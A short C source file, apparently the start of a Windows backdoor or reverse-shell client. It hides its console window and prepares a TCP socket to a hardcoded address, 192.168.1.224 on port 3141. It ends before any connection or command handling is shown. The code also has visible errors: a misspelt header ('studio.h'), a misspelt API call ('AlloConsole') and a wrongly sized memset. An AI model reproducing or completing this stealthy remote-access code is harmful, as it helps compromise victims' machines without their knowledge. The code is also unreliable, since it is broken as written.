#include <studio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

int sock;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

  HWND stealth;
  AlloConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);

  ShowWindow(stealth, 0);

  struct sockaddr_in ServAddr;
  unsigned short ServPort;
  char *ServIP;
  WSADATA wsaData;

  ServIP = "192.168.1.224";
  ServPort = 3141;

  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
    exit(1);
  }

  sock = socket(AF_INET, SOCK_STREAM, 0);

  memset(&ServAddr, 0, sizeof(ServPort));
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServIP);
  ServAddr.sin_port = htons(ServPort);
}
